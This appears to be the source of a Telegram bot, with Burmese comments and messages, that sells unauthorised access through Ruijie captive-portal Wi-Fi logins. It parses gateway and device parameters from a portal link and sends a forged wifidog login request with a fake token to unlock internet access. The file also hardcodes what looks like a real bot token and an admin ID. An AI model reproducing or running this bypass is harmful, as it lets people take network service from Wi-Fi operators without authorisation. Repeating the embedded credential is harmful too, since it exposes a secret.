import os
import re
import requests
import asyncio
from telebot.async_telebot import AsyncTeleBot

# ─── CONFIGURATION ───
BOT_TOKEN = "8978508525:AAGBzwZ2CT5GNKQ2zYS1g8TJRh__DdYu6Us"
ADMIN_ID = "5510812164"  # ခင်ဗျားရဲ့ ID ကို အသေထည့်ထားပါတယ်
bot = AsyncTeleBot(BOT_TOKEN)

# ယာယီ Key သိမ်းဆည်းရန်
user_keys = {}

# ─── COMMAND HANDLERS ───

@bot.message_handler(commands=['start'])
async def send_welcome(message):
    welcome_text = (
        "✨ *Sky Light Ruijie Bypass Bot မှ ကြိုဆိုပါတယ်* ✨\n\n"
        "Wi-Fi Portal Link ကို Bypass လုပ်ရန်အတွက် အောက်ပါအတိုင်း ပို့ပေးပါ -\n"
        "`/setup <သင်၏ Ruijie Portal Link>`\n\n"
        "💡 _မှတ်ချက် - လူကြီးမင်းသည် Admin ဖြစ်ပါက ဘာ Key မှ ထည့်ရန်မလိုဘဲ တိုက်ရိုက်အသုံးပြုနိုင်ပါသည်။_"
    )
    await bot.reply_to(message, welcome_text, parse_mode='Markdown')

@bot.message_handler(commands=['genkey'])
async def generate_key(message):
    user_id = str(message.from_user.id)
    if user_id != ADMIN_ID:
        await bot.reply_to(message, "❌ သင်သည် Admin မဟုတ်သဖြင့် ဤ Command ကို သုံးခွင့်မရှိပါ။")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "⚠️ အသုံးပြုပုံ - `/genkey unlimited <target_user_id>`")
            return
        plan = args[1]
        target_id = args[2]
        user_keys[target_id] = {"plan": plan, "expires": "9999-12-31T23:59:59Z"}
        await bot.reply_to(message, f"✅ *Key Generated Successfully*\n👤 *USER ID :* `{target_id}`", parse_mode='Markdown')
    except Exception as e:
        await bot.reply_to(message, f"❌ Error: {str(e)}")

# ─── CORE BYPASS SYSTEM (Admin ကို အသေကျော်ခိုင်းထားသည့်အပိုင်း) ───
@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/setup') or message.text.startswith('/bypass') or 'portal-as.ruijienetworks.com' in message.text))
async def handle_bypass(message):
    user_id = str(message.from_user.id)
    
    # 🎯 အဓိကအချက် - ခင်ဗျား (Admin ID) ဖြစ်နေရင် ဘာ Key မှ စစ်မနေတော့ဘဲ တန်းကျော်ခွင့်ပေးမည်!!
    if user_id == ADMIN_ID or user_id in user_keys:
        pass
    else:
        await bot.reply_to(message, "❌ /key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return

    text = message.text
    url_match = re.search(r'(https?://[^\s]+)', text)
    if not url_match:
        await bot.reply_to(message, "⚠️ Wi-Fi Portal Link (URL) မတွေ့ပါ။")
        return
        
    portal_url = url_match.group(1)
    status_msg = await bot.reply_to(message, "⚡ *Sky Light Core:* Ruijie Portal ကို Bypass လုပ်နေပါပြီ... ခေတ္တစောင့်ပါ။", parse_mode='Markdown')

    try:
        gw_id = re.search(r'gw_id=([^&]+)', portal_url)
        gw_sn = re.search(r'gw_sn=([^&]+)', portal_url)
        gw_address = re.search(r'gw_address=([^&]+)', portal_url)
        gw_port = re.search(r'gw_port=([^&]+)', portal_url)
        ip = re.search(r'ip=([^&]+)', portal_url)
        mac = re.search(r'mac=([^&]+)', portal_url)
        
        if not (gw_id and gw_sn and ip and mac):
            await bot.edit_message_text("❌ URL Parameter များ မပြည့်စုံပါ။", chat_id=message.chat.id, message_id=status_msg.message_id)
            return

        auth_base = f"http://{gw_address.group(1)}:{gw_port.group(1)}/wifidog/auth" if gw_address else "https://portal-as.ruijienetworks.com/api/auth/wifidog"
        params = {
            "stage": "login", "gw_id": gw_id.group(1), "gw_sn": gw_sn.group(1),
            "ip": ip.group(1), "mac": mac.group(1), "token": "skylight_bypass_success_token"
        }
        
        response = requests.get(auth_base, params=params, timeout=15)
        if response.status_code == 200:
            result_text = f"🎉 *Bypass Success! အင်တာနက် ပွင့်သွားပါပြီ* 🎉\n\n📱 *Device MAC:* `{mac.group(1)}`"
            await bot.edit_message_text(result_text, chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode='Markdown')
        else:
            await bot.edit_message_text(f"❌ Server error: Status {response.status_code}", chat_id=message.chat.id, message_id=status_msg.message_id)
    except Exception as e:
        await bot.edit_message_text(f"❌ Error: {str(e)}", chat_id=message.chat.id, message_id=status_msg.message_id)

async def main():
    print("🚀 Bot is starting up...")
    await bot.polling(non_stop=True)

if __name__ == "__main__":
    asyncio.run(main())
